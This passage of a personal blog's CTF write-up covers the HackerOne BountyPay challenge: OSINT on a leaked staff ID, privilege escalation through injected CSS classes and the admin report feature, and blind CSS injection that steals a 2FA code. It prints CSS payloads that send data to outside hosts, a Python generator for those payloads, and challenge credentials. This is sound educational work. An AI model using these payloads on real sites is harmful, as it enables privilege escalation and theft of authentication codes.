<p>But unfortunately, nearly 1-2 hours of fuzzing did not result in anything to move forward. At this point, I had tried multiple scenarios from the account takeover scene to weird obscure fuzzing to create a valid staff account.<br><strong>Turns out, I was again one of those few unfortunates who reached this stage too early!</strong> The hint for this next step was given just after I solved this step.</p>
<p>After too much of cosmic fuzzing, I started thinking maybe Fuzzing is not the way forward, like Git repo &amp; Android challenges, there is a another dimension than Web to it. Maybe of OSINT. A scenario like staff leaking credentials on public forum is possible.<br>So I searched for terms like <code>&quot;BountyPay&quot;, &quot;staff_id&quot;, &quot;Sam Jenkins&quot;, &quot;Brian Oliver&quot;, &quot;STF:KE624RQ2T9&quot;</code> on Github, Pastebin, Linkedin, Facebook and at Last on Twitter! and found this tweet(later Hackerone retweeted it to give hint 😬):</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/bp_tweet.png" title="staff">
<p>We find Sandra in BountyPay HQ’s following accounts and in her account we find her <a href="https://twitter.com/SandraA76708114/status/1258693001964068864" target="_blank" rel="noopener">uploaded photo</a> of Employee ID card containing what we need, the precious <code>staff_id=STF:8FJ3KFISL3</code></p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/id_sandra.png" title="staff">
<p>Now we have an account of newly joined employee Sandra on Staff.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandra.allison : s%3D8qB8zEpMnc*xsz7Yp5</span><br></pre></td></tr></table></figure></p>
<p>This marked my 16th hour of continuous hacking on this CTF, after this, I went to sleep 😪</p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Looking around on the Staff App through Sandra’s account, We notice some fishy things:</p>
<ol>
<li><code>Template</code> parameter is client-controlled.</li>
<li>A weird way of updating Profile image through CSS(<code>css/style.css</code>) classes by having inline images as base64 encoding served through Data URI.</li>
<li>There is an <code>admin</code> role to some staff accounts.</li>
<li><code>Report This Page</code> feature for admin to visit and see if there is something wrong.</li>
<li>And the most interesting:</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">".upgradeToAdmin"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> t = $(<span class="string">'input[name="username"]'</span>).val();</span><br><span class="line">    $.get(<span class="string">"/admin/upgrade?username="</span> + t, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"User Upgraded to Admin"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;), $(<span class="string">".tab"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $(<span class="string">".tab"</span>).removeClass(<span class="string">"active"</span>), $(<span class="keyword">this</span>).addClass(<span class="string">"active"</span>), $(<span class="string">"div.content"</span>).addClass(<span class="string">"hidden"</span>), $(<span class="string">"div.content-"</span> + $(<span class="keyword">this</span>).attr(<span class="string">"data-target"</span>)).removeClass(<span class="string">"hidden"</span>), !<span class="number">1</span></span><br><span class="line">&#125;), $(<span class="string">".sendReport"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">"/admin/report?url="</span> + url, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"Report sent to admin team"</span>)</span><br><span class="line">    &#125;), $(<span class="string">"#myModal"</span>).modal(<span class="string">"hide"</span>)</span><br><span class="line">&#125;), <span class="built_in">document</span>.location.hash.length &gt; <span class="number">0</span> &amp;&amp; (<span class="string">"#tab1"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab1"</span>).trigger(<span class="string">"click"</span>), <span class="string">"#tab2"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab2"</span>).trigger(<span class="string">"click"</span>), <span class="string">"#tab3"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab3"</span>).trigger(<span class="string">"click"</span>), <span class="string">"#tab4"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab4"</span>).trigger(<span class="string">"click"</span>));</span><br></pre></td></tr></table></figure>
<p>The <code>/js/website.js</code> Javascript File.</p>
<p>It has an endpoint <code>GET /admin/upgrade?username=</code> which was for upgrading staff to an admin. But only upon admins invoking, it would work. Ohk, so we do have a CSRF-ish feature of <code>Report This Page</code> to admin. So lets report <strong>/admin/upgrade?username=sandra.allision</strong></p>
<p>But the feature has security enabled!<br><code>Pages in the /admin directory will be ignored for security</code></p>
<p>After following every rabbit hole of bypassing this feature I gave up on it and started to look for something else and the last line of JS file caught my eye.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">"#tab1"</span> === <span class="built_in">document</span>.location.hash &amp;&amp; $(<span class="string">".tab1"</span>).trigger(<span class="string">"click"</span>), ..</span><br></pre></td></tr></table></figure>
<p>This is almost useless in the app’s context, But it does one very interesting thing, and i.e. it triggers click event.</p>
<p>So if <code>#tab2</code> is in the URL, all elements with class tab2 will get their click event triggered. And what if, one of that element has class <code>upgradeToAdmin</code>? Yep the click handler in our JS will fire the <code>GET /admin/upgrade?username=</code>. We also have a way to control CSS of elements through the <code>Update avatar feature</code> which takes an avatar class from the client-side. </p>
<p>So <code>profile_avatar=tab1 upgradeToAdmin</code> and <code>#tab1</code> fragment in URI will trigger the ajax. But we want this to be triggered by admin. We need to report the page to admin where our injected classes are getting reflected? And we do have a unique and relevant page of tickets <code>/?template=ticket&amp;ticket_id=3582</code> where our classes are Reflected in our avatar element 🔥 So, Reporting <strong>/?template=ticket&amp;ticket_id=3582#tab1</strong> with <strong>profile_avatar=tab1+upgradeToAdmin</strong> will do the trick!</p>
<p>But we are still Just missing one thing of the puzzle.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> t = $(<span class="string">'input[name="username"]'</span>).val();</span><br><span class="line">    $.get(<span class="string">"/admin/upgrade?username="</span> + t, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br></pre></td></tr></table></figure>
<p>we still don’t have a page to report on which our CSS classes are reflected as well as has an input element with name attribute <code>username</code> &amp; value set to <code>sandra.allison</code> 😢 </p>
<p>There were two possibilities, either there is HTMLi in the username or we have to use the Login template. The later seemed impossible at the moment so followed a bit of rabbit hole. But the use of the <code>template</code> parameter in query was itchy, it must have some use in CTF or else one could easily develop an app UI without such parameter.</p>
<p>I thought, What If we could load two templates(Login &amp; Ticket) simultaneously with this param, and literally laughed 😆 But when I fuzzed the template parameter, I was shocked and ecstatic. literally. We can load multiple templates in one page indeed 🤯</p>
<p><strong>/?template[0]=login\&amp;template[1]=ticket&amp;ticket_id=3582#tab1</strong></p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/simult-temp.png" title="staff">
<p>It only not loaded two templates, It also respected <code>ticket_id</code> parameter. This definitely showed me that this is not a rabbit hole! Now as I was confident about my partial exploit URL to report to Admin, We still need value populated in input tag as <code>sandra.allison</code>. It was very easy to deduce that we are missing something in our URL, a query parameter probably that will populate input tag, a fair guess is <code>username</code> in the query. And yes! Application reflects it back into Login template in attribute <code>value</code>.</p>
<p>Final Exploit:</p>
<p><strong>/admin/report?url=Base64(?template[0]=login&amp;username=sandra.allison&amp;template[1]=ticket&amp;ticket_id=3582#<br>tab1</strong> )</p>
<p>We report it and Sandra is now Admin! 👸</p>
<p>This Step was my favorite step in the CTF 🧠. The thing I liked was the components(Js &amp; CSS) involved in solution were not just there for CTF, it was actually a working code and yet it gave us Privilege Escalation exploit.</p>
<p>After becoming admin, we get to know that BountyPay’s admins basically can see customers passwords in plaintext 👀, <a href="https://twitter.com/Hacker0x01/status/1266454022124376064" target="_blank" rel="noopener">@Hackerone</a> could have just contacted BountyPay support instead of declaring CTF to get Marten’s credentials (<strong>marten.mickos : h\&amp;H5wy2Lggj*kKn4OD&amp;Ype</strong>) but where’s the fun in that 🙂</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/marten_creds.png" title="staff">
<h2 id="Stealing-Payment-2FA-Code-using-CSS"><a href="#Stealing-Payment-2FA-Code-using-CSS" class="headerlink" title="Stealing Payment 2FA Code using CSS"></a>Stealing Payment 2FA Code using CSS</h2><p>We Login with these creds on App, Again bypassing the Login 2FA with the trick from step 2, Get the May 2020’s bounties, Click Pay, and ..</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/meme.jpg" title="meme">
<p>Another 2FA challenge! 😨</p>
<p>This time the implementation was different,  First it asked us to send the 2FA challenge code, Then sent a POST request,</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/style_post.png" title="style">
<p>Seems like It’s taking the URL of a stylesheet which is used for styling the 2FA code page. To just confirm that if it can be changed to our controlled CSS and the execution context we are in:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/collab.png" title="collab">
<p>No, Problem. ⚔️ We do have the Awesome research <a href="https://docs.google.com/viewer?url=www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt" target="_blank" rel="noopener">The Sexy Assassin - Tactical Exploitation using CSS</a> from legendary Gareth Heyes, David Lindsay, and Eduardo Vela. TL;DR, We can exfiltrate the data from the 2FA page sent to Marten if some conditions are met. Attack Methodology from the above research:</p>
<h3 id="CSS-can-Compute"><a href="#CSS-can-Compute" class="headerlink" title="CSS can Compute!"></a>CSS can Compute!</h3><p>How:<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element:condition&#123;</span><br><span class="line">    action;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>So, a CSS payload like:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value*="secret"]</span>&#123;&#125; &#123;</span><br><span class="line">    <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://attacker.com/?value_contains=secret"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>will successfully exfiltrate the information that one of the input tag on the HTML page contains value <code>secret</code> somewhere. In this way, we can use <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors" target="_blank" rel="noopener">CSS Attribute Selectors</a> for our exfiltration.</p>
<p>So let’s go step by step to deduce what’s on the marten’s payment 2FA page:</p>
<p><strong>1. What elements?</strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?input"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?a"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?p"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?div"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>we get the<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"GET /?div HTTP/1.1" 200 -</span><br><span class="line">"GET /?input HTTP/1.1" 200 -</span><br></pre></td></tr></table></figure></p>
<p>Ok, so we do have \<input\> tags to get the data out of em with payload like:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^="s"]</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?s"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></input\></p>
<p>But as this is a <strong>Blind CSS injection</strong> scenario, we can’t use classic techniques of exfiltrating the multi-length values, which require the vulnerable page to be iframe-able.* <a href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html" target="_blank" rel="noopener">Reference.</a></p>
<p>This leaves us with only one possibility that either the 2FA code is of length one(unlikely) or the challenge author has put code in multiple input tags with each character in one of them!</p>
<p><strong>2. How many &#x3c;input&#x3e;s?</strong><br>To get the idea of how many tags are there, we can use the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type" target="_blank" rel="noopener">:nth-of-type</a> CSS pseudo-class:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Selects every fourth &lt;input&gt; element with value "s" </span></span><br><span class="line"><span class="comment">   among any group of siblings */</span></span><br><span class="line">   </span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value="s"]</span><span class="selector-pseudo">:nth-of-type(4)</span>&#123;</span><br><span class="line">    <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"https://tunnel.shoebpatel.com/?its-4th-child"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This will only fire if there are <strong>4 consecutive or more</strong> input tags in a parent element.</p>
<p>We find out that there are <strong>7!</strong></p>
<p>So we can picturize the 2FA code page as following HTML:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"4"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"6"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"7"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>So wrote a quick python script from above observations that generates payload CSS file which will exfiltrate the values from all of &#x3c;input&#x3e; tags at once and will tell us the sequence of their occurrence too.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $ python ./css_exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2FA gotta be Alphanumeric</span></span><br><span class="line">alpha_num = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span></span><br><span class="line">exploit = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#For each of 7 input tags</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">  pos = str(pos)</span><br><span class="line">  <span class="comment">#For each alpha numeric character</span></span><br><span class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> alpha_num:</span><br><span class="line">    exploit += <span class="string">'''input[value="'''</span>+char+<span class="string">'''"]:nth-of-type('''</span>+pos+<span class="string">''')&#123;</span></span><br><span class="line"><span class="string">    background-image:url("https://tunnel.shoebpatel.com/?position='''</span>+pos+<span class="string">'''&amp;char='''</span>+char+<span class="string">'''");</span></span><br><span class="line"><span class="string">&#125;\n'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"2fa-exploit.css"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> file:</span><br><span class="line">  file.write(exploit)</span><br></pre></td></tr></table></figure>
<p>As soon as we send our <code>2fa-exploit.css</code>, we get 7 hits:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/ngrok_exfill.png" title="ngrok">
<p>Assembling them in sequence gives us the 2FA code: <strong>RT8i1EC</strong> </p>
<p>And, Pwned! 💣</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/flag.png" title="ngrok">
<p>We finally get the message that we completed the challenge and the PoC Flag🚩:<br><strong>\^FLAG\^736c635d8842751b8aafa556154eb9f3\$FLAG\$</strong> 🤘</p>
<h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><p>Thanks for reading, I tried as much as I could to make this a short read without missing details and the rabbit holes that I followed. I wanted to showcase all of my depth-first approaches but at the time of writing this up, already some days have passed and I forgot some of them. I hope you enjoyed reading it as much as I loved solving this challenge.</p>
<p>- CaptainFreak</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/CaptainFreak">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HackerOne-2006-CTF-Writeup"><span class="toc-number">1.</span> <span class="toc-text">HackerOne-2006 CTF Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Index"><span class="toc-number">1.1.</span> <span class="toc-text">Index</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Recon"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exposed-git-directory"><span class="toc-number">1.3.</span> <span class="toc-text">Exposed .git directory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Login-2FA-Bypass"><span class="toc-number">1.4.</span> <span class="toc-text">Login 2FA Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-Side-Request-Forgery"><span class="toc-number">1.5.</span> <span class="toc-text">Server Side Request Forgery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Android-Challenges"><span class="toc-number">1.6.</span> <span class="toc-text">Android Challenges</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-OSINT"><span class="toc-number">1.7.</span> <span class="toc-text">API + OSINT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stealing-Payment-2FA-Code-using-CSS"><span class="toc-number">1.9.</span> <span class="toc-text">Stealing Payment 2FA Code using CSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSS-can-Compute"><span class="toc-number">1.9.1.</span> <span class="toc-text">CSS can Compute!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-End"><span class="toc-number">1.10.</span> <span class="toc-text">The End</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&text=HackerOne-2006 CTF Writeup"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&is_video=false&description=HackerOne-2006 CTF Writeup"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackerOne-2006 CTF Writeup&body=Check out this article: https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&title=HackerOne-2006 CTF Writeup"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.shoebpatel.com/2020/06/19/HackerOne-2006-CTF-Writeup/&name=HackerOne-2006 CTF Writeup&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 CaptainFreak
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/CaptainFreak">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-113860447-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'captainfreaks-infosec-blog';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


